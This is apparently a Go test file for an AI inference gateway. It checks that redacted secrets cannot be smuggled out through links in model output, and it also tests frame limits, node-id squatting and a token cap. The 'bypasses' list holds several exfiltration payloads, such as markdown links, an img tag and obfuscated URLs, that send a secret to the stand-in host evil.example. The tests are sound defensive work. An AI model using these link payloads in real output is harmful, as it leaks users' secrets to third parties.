// Tests for the re-review findings (2026-10-10): link bypasses, own-node routing, frame
// limits, malformed frames, id squatting, max_tokens cap.
//
// SPDX-License-Identifier: Apache-2.0
package e2e

import (
	"context"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/http/httptest"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/coder/websocket"

	"github.com/aisathome/aisathome/gateway"
	"github.com/aisathome/aisathome/protocol"
)

// bypasses are node outputs that try to get a secret restored inside something a client
// would fetch. PH is replaced by the placeholder the node received.
var bypasses = []string{
	"[1]: https://evil.example/a,b?k=PH",
	"[1]: https://evil.example/a'b?k=PH",
	"[1]: https://evil.example/a(b?k=PH",
	"[1]: //evil.example/?k=PH",
	"https://evil.example/" + strings.Repeat("a", 600) + "?k=PH",
	"https&#58;//evil.example/?k=PH",
	`<img alt=">" src="//evil.example/?k=PH">`,
	"evil.example/?k=PH",
	"see https:\\/\\/evil.example\\/?k=PH",
}

// caseEngine answers "CASE n ..." with bypass n (or "plain PH" for n = -1), in 3-char chunks.
func caseEngine(t *testing.T) *httptest.Server {
	return httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if health(w, r) {
			return
		}
		raw, _ := io.ReadAll(r.Body)
		ph := placeholderRe.FindString(string(raw))
		var n int
		fmt.Sscanf(strings.SplitN(string(raw), "CASE ", 2)[1], "%d", &n)
		out := "plain " + ph
		if n >= 0 {
			out = strings.ReplaceAll(bypasses[n], "PH", ph)
		}
		w.Header().Set("Content-Type", "text/event-stream")
		for i := 0; i < len(out); i += 3 {
			b, _ := json.Marshal(map[string]any{"choices": []any{map[string]any{"index": 0, "delta": map[string]any{"content": out[i:min(i+3, len(out))]}}}})
			fmt.Fprintf(w, "data: %s\n\n", b)
		}
		fmt.Fprint(w, "data: {\"choices\":[{\"index\":0,\"delta\":{},\"finish_reason\":\"stop\"}]}\n\n")
		fmt.Fprint(w, "data: [DONE]\n\n")
	}))
}

func TestLinkBypassesStayClosed(t *testing.T) {
	r := newRig(t, caseEngine(t))
	ask := func(n int, stream bool) string {
		body, _ := json.Marshal(map[string]any{"model": "deep", "stream": stream,
			"messages": []any{map[string]any{"role": "user", "content": fmt.Sprintf("CASE %d key %s", n, secret)}}})
		text, _ := readAnswer(t, r.do(t, "POST", "/v1/chat/completions", "user-key", string(body)), stream)
		return text
	}
	for _, stream := range []bool{true, false} {
		if got := ask(-1, stream); !strings.Contains(got, secret) { // control: plain text is restored
			t.Fatalf("stream=%v: plain text not restored: %q", stream, got)
		}
		for n, b := range bypasses {
			if got := ask(n, stream); strings.Contains(got, secret) {
				t.Errorf("stream=%v: bypass %d restored the secret: %q", stream, n, b)
			}
		}
	}
}

// On a route restricted to the user's own nodes nothing is redacted (the operator is the user).
func TestOwnNodesSeeRealValues(t *testing.T) {
	var seen []string
	var mu sync.Mutex
	r := newRigCfg(t, func(c *gateway.Config) {
		c.NodeTokens["mine"] = gateway.NodeToken{Operator: "vol"}
		c.Keys["own-key"] = gateway.KeyInfo{User: "vol", OnlyOperator: "vol"}
	})
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	r.startNode(ctx, "my-node", "mine", echoEngine(t, &seen, &mu), 2)
	r.waitNodes(t, 1)
	for _, key := range []string{"own-key", "user-key"} {
		body, _ := json.Marshal(map[string]any{"model": "deep", "messages": []any{map[string]any{"role": "user", "content": "k " + secret}}})
		resp := r.do(t, "POST", "/v1/chat/completions", key, string(body))
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()
	}
	mu.Lock()
	defer mu.Unlock()
	if len(seen) != 2 || !strings.Contains(seen[0], secret) || strings.Contains(seen[1], secret) {
		t.Fatalf("own key must see the real value, others the placeholder: %v / %v",
			strings.Contains(seen[0], secret), strings.Contains(seen[1], secret))
	}
}

// rawNodeWith connects a hand-written node that answers requests with onRequest.
func rawNodeWith(t *testing.T, r *rig, id, token string, onRequest func(write func(protocol.Msg), raw func([]byte), m protocol.Msg)) *websocket.Conn {
	t.Helper()
	ctx, cancel := context.WithCancel(context.Background())
	t.Cleanup(cancel)
	h := http.Header{}
	h.Set("Authorization", "Bearer "+token)
	c, _, err := websocket.Dial(ctx, "ws"+strings.TrimPrefix(r.gw.URL, "http")+"/v1/node/connect", &websocket.DialOptions{HTTPHeader: h})
	if err != nil {
		t.Fatal(err)
	}
	c.SetReadLimit(16 << 20)
	raw := func(b []byte) { c.Write(ctx, websocket.MessageText, b) }
	write := func(m protocol.Msg) { b, _ := json.Marshal(m); raw(b) }
	write(protocol.Msg{Type: protocol.TypeHello, NodeID: id, Protocol: protocol.Version,
		Models: []protocol.ModelInfo{{Name: "qwen3.8-27b-q4", Roles: []string{"deep"}, Slots: 2}}})
	go func() {
		for {
			_, b, err := c.Read(ctx)
			if err != nil {
				return
			}
			var m protocol.Msg
			json.Unmarshal(b, &m)
			if m.Type == protocol.TypeRequest {
				onRequest(write, raw, m)
			}
		}
	}()
	return c
}

func chunkMsg(id, text string) protocol.Msg {
	b, _ := json.Marshal(map[string]any{"choices": []any{map[string]any{"index": 0, "delta": map[string]any{"content": text}}}})
	return protocol.Msg{Type: protocol.TypeChunk, ReqID: id, Data: b}
}

func TestOversizedChunkDropsNode(t *testing.T) {
	r := newRigCfg(t, nil)
	rawNodeWith(t, r, "big", "node-token", func(write func(protocol.Msg), _ func([]byte), m protocol.Msg) {
		write(chunkMsg(m.ReqID, strings.Repeat("x", 200<<10)))
	})
	r.waitNodes(t, 1)
	start := time.Now()
	resp := r.do(t, "POST", "/v1/chat/completions", "user-key", chatBody)
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode == 200 && time.Since(start) < time.Second {
		t.Fatalf("a 200 KB chunk was accepted")
	}
	r.waitNodes(t, 0)
}

func TestMalformedFrameDoesNotDropNode(t *testing.T) {
	r := newRigCfg(t, nil)
	rawNodeWith(t, r, "messy", "node-token", func(write func(protocol.Msg), raw func([]byte), m protocol.Msg) {
		raw(nil)                 // empty frame
		raw([]byte("{not json")) // garbage
		write(chunkMsg(m.ReqID, "ok"))
		write(protocol.Msg{Type: protocol.TypeDone, ReqID: m.ReqID, Usage: &protocol.Usage{PromptTokens: 3, CompletionTokens: 1}})
	})
	r.waitNodes(t, 1)
	resp := r.do(t, "POST", "/v1/chat/completions", "user-key", chatBody)
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if resp.StatusCode != 200 || r.g.NodeCount() != 1 {
		t.Fatalf("status %d, nodes %d: a bad frame must be skipped, not drop the node", resp.StatusCode, r.g.NodeCount())
	}
}

func TestBoundIDCannotBeSquatted(t *testing.T) {
	r := newRigCfg(t, func(c *gateway.Config) {
		c.NodeTokens["home-token"] = gateway.NodeToken{Operator: "owner", NodeID: "home-1", Trust: "trusted"}
		c.NodeTokens["other-token"] = gateway.NodeToken{Operator: "mallory"}
	})
	rawNodeWith(t, r, "home-1", "other-token", func(func(protocol.Msg), func([]byte), protocol.Msg) {})
	time.Sleep(300 * time.Millisecond)
	if r.g.NodeCount() != 0 {
		t.Fatal("another token squatted a bound node id")
	}
	rawNodeWith(t, r, "home-1", "home-token", func(func(protocol.Msg), func([]byte), protocol.Msg) {})
	r.waitNodes(t, 1)
}

func TestMaxTokensCapped(t *testing.T) {
	var last atomic.Value
	r := newRig(t, captureEngine(t, &last))
	resp := r.do(t, "POST", "/v1/chat/completions", "user-key",
		`{"model":"deep","max_tokens":1000000,"messages":[{"role":"user","content":"hi"}]}`)
	io.Copy(io.Discard, resp.Body)
	resp.Body.Close()
	if got := last.Load().(map[string]any)["max_tokens"].(float64); got > 32768 {
		t.Fatalf("node was asked for %v tokens", got)
	}
}
